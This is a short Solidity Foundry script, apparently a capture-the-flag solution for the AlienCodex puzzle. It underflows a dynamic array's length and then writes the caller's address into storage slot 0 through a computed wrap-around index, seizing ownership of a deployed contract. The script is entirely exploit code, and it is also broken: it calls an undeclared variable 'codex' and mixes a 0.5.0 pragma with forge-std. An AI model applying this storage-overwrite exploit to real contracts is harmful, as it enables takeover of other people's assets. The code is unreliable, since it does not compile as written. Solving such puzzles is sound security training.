//SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import {Script,console} from "forge-std/Script.sol";
import {AlienCodex} from "../src/AlienCode.sol";


contract AlienCodexSolution is Script {

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    AlienCodex alienCodexInstance = AlienCodex(0x2afE74b14Cf65281945ab2972f81abD6178cC620);
    uint256 index = (2**256) - uint256(keccak256(abi.encode(1)));
    bytes32 myAddress = bytes32(uint256(uint160(msg.sender)));
    alienCodexInstance.makeContact();
    codex.retract();
    codex.revise(index,myAddress);
    vm.stopBroadcast();
  }
}